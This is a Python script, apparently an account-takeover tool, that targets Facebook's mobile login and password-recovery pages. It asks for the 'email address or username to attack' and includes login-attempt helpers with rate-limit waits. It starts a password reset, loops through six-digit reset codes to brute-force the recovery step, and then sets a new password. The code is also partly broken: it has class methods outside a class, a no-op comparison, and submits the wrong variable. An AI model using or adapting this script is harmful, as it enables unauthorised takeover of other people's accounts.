import itertools
import sys
from time import sleep
from bs4 import BeautifulSoup
import requests
import mechanize
import os
CHRS = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'

MOZILLA_UAS = 'Mozilla/5.0 (X11; U; Linux i686; en-US) ' \
              'AppleWebKit/534.7 (KHTML, like Gecko) ' \
              'Chrome/7.0.517.41 Safari/534.7' 

LOGIN_URL = 'https://mbasic.facebook.com/login/?ref=dbl&fl&login_from_aymh=1'

def __init__(self):
    self.browser = self.setup_browser()

def setup_browser(self):
    browser = mechanize.Browser()
    browser.set_handle_robots(False)
    cookies = mechanize.CookieJar()
    browser.set_cookiejar(cookies)
    browser.addheaders = [('User-agent', MOZILLA_UAS)]
    browser.set_handle_refresh(False)
    return browser

def send_login(self, email, password):
    self.browser.open(self.LOGIN_URL)
    self.browser.select_form(nr=0)
    self.browser.form['email'] = email
    self.browser.form['pass'] = password
    return self.browser.submit().read()

def try_password(self, email, password):
    print ('Trying %s' % password)
    data = self.send_login(email, password)

    if self.is_too_often(data):
        print ('Facebook says we\'re trying too often. Waiting 30 seconds.')
        sleep(30)
        self.try_password(password)

    if self.is_logged_in(data):
        print ('Password found: %s' % password )
        sys.exit()
os.system('clear')
soup = BeautifulSoup()
email = input('Email address or username to attack:')
"""password = input('Password:')"""
browser = mechanize.Browser()
browser.set_handle_robots(False)
cookies = mechanize.CookieJar()
browser.set_cookiejar(cookies)
browser.addheaders = [('User-agent', MOZILLA_UAS)]
browser.set_handle_refresh(False)
browser.open('https://mbasic.facebook.com/login/identify/?ctx=recover&c=https%3A%2F%2Fmbasic.facebook.com%2Flogin%2F%3Fnext%26ref%3Ddbl%26fl%26login_from_aymh%3D1%26refid%3D8&multiple_results=0&ars=facebook_login&from_login_screen=0&lwv=100&ref=dbl&_rdr')
browser.select_form(nr=0)
browser.form['email'] = email
browser.submit()
"""selection confirmation"""
browser.select_form(nr=0)
browser.submit()
browser.select_form(nr=0)
browser.submit()
browser.select_form(nr=0)
browser.submit()
y = input('Continue? 1,2, else:')
"""reset code input"""
browser.select_form(nr=0)
url1 = browser.geturl()
print(browser.geturl())
reset = input('Code: ')
browser.form['n'] = reset
browser.submit()
reset = 999999
while reset > 99999:
  browser.select_form(nr=0)
  y == reset
  browser.form['n'] = str(y)
  browser.submit()
  url = browser.geturl()
  print(str(reset))
  reset = reset-1
  sleep(30)
"""new password"""
forms = list(browser.forms())
form = forms[0]
print(form)
y = input('Continue/Exit? ')
if y == 1:
  exit()
else:
  new = input('New Password: ')
  browser.select_form(nr=0)
  browser.form['password_new'] = new
  """browser.form['n'] = x"""
